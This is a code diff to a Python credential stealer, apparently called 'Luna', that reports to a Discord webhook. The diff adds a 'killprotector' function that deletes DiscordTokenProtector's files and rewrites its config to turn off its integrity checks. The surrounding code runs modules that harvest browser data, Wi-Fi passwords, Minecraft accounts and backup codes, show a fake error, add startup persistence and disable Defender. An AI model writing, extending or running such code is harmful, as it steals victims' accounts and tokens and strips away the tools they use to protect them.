@@ -33,7 +33,7 @@ __DEFENDER__ = "%_defender_enabled%"
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, fakeerror, startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
 
     for func in threads:
@@ -72,7 +72,7 @@ def Luna(webhook: str):
         proc(webhook)
 
 
-def try_extract(func):
+def trygrab(func):
     def wrapper(*args, **kwargs):
         try:
             func(*args, **kwargs)
@@ -112,6 +112,44 @@ def create_temp(_dir: str or os.PathLike = gettempdir()):
     path = os.path.join(_dir, file_name)
     open(path, "x")
     return path
+
+
+def killprotector():
+    roaming = os.getenv('APPDATA')
+    path = f"{roaming}\\DiscordTokenProtector\\"
+    config = path + "config.json"
+
+    if not os.path.exists(path):
+        return
+
+    for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+        try:
+            os.remove(path + process)
+        except FileNotFoundError:
+            pass
+
+    if os.path.exists(config):
+        with open(config, errors="ignore") as f:
+            try:
+                item = json.load(f)
+            except json.decoder.JSONDecodeError:
+                return
+            item['auto_start'] = False
+            item['auto_start_discord'] = False
+            item['integrity'] = False
+            item['integrity_allowbetterdiscord'] = False
+            item['integrity_checkexecutable'] = False
+            item['integrity_checkhash'] = False
+            item['integrity_checkmodule'] = False
+            item['integrity_checkscripts'] = False
+            item['integrity_checkresource'] = False
+            item['integrity_redownloadhashes'] = False
+            item['iterations_iv'] = 364
+            item['iterations_key'] = 457
+            item['version'] = 69420
+
+        with open(config, 'w') as f:
+            json.dump(item, f, indent=2, sort_keys=True)
 
 
 class PcInfo:
@@ -369,7 +407,7 @@ class Discord:
             username="Luna")
 
 
-@try_extract
+@trygrab
 class Browsers:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
@@ -532,7 +570,7 @@ class Browsers:
         f.close()
 
 
-@try_extract
+@trygrab
 class Wifi:
     def __init__(self):
         self.wifi_list = []
@@ -570,7 +608,7 @@ class Wifi:
         f.close()
 
 
-@try_extract
+@trygrab
 class Minecraft:
     def __init__(self):
         self.roaming = os.getenv("appdata")
@@ -605,7 +643,7 @@ class Minecraft:
         f.close()
 
 
-@try_extract
+@trygrab
 class BackupCodes:
     def __init__(self):
         self.path = os.environ["HOMEPATH"]
